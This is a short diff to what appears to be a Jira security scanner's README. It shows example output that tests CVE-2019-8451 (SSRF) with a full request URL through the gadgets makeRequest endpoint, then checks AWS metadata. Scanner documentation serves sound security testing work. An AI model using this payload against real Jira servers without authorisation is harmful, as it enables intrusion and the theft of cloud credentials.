@@ -144,7 +144,7 @@ ex: CVE-2019-8442
 
 ex: CVE-2019-8451
 ```
-INFO: IN DEVELOPMENT Checking for CVE-2019-8451 (SSRF)
+INFO: Checking for CVE-2019-8451 (SSRF)
 [Testing URL]: http://JIRASERVER:8080/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@example.com
 [!!] [SSRF] Vulnerable to CVE-2019-8451 (SSRF): http://JIRASERVER/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@example.com
 	Checking AWS Metadata
